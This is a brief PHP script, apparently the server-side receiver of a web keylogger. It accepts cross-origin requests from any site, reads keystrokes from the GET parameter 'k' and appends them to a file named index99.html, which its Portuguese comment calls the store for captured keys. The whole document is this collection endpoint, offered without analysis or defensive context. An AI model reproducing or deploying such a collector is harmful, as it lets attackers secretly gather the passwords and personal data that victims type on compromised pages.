<?php
header("Access-Control-Allow-Origin: *");
if (isset($_GET['k'])) {
    $key = $_GET['k'];
    $file = 'index99.html'; // Nome do arquivo para armazenar as teclas
    file_put_contents($file, $key, FILE_APPEND);
}
?>

